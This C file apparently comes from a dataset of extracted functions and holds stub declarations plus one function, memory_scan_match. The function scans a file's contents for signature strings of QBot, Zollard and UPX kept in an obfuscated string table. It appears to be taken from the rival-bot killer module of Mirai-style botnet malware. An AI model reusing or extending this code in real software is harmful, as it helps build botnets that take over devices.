#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  rdbuf ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  TABLE_MEM_QBOT ; 
 int /*<<< orphan*/  TABLE_MEM_QBOT2 ; 
 int /*<<< orphan*/  TABLE_MEM_QBOT3 ; 
 int /*<<< orphan*/  TABLE_MEM_UPX ; 
 int /*<<< orphan*/  TABLE_MEM_ZOLLARD ; 
 int /*<<< orphan*/  TRUE ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ mem_exists (char*,int,char*,int) ; 
 int open (char*,int /*<<< orphan*/ ) ; 
 int read (int,char*,int) ; 
 int /*<<< orphan*/  table_lock_val (int /*<<< orphan*/ ) ; 
 char* table_retrieve_val (int /*<<< orphan*/ ,int*) ; 
 int /*<<< orphan*/  table_unlock_val (int /*<<< orphan*/ ) ; 

__attribute__((used)) static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;
    int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_QBOT);
    table_unlock_val(TABLE_MEM_QBOT2);
    table_unlock_val(TABLE_MEM_QBOT3);
    table_unlock_val(TABLE_MEM_UPX);
    table_unlock_val(TABLE_MEM_ZOLLARD);

    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_QBOT2);
    table_lock_val(TABLE_MEM_QBOT3);
    table_lock_val(TABLE_MEM_UPX);
    table_lock_val(TABLE_MEM_ZOLLARD);

    close(fd);

    return found;
}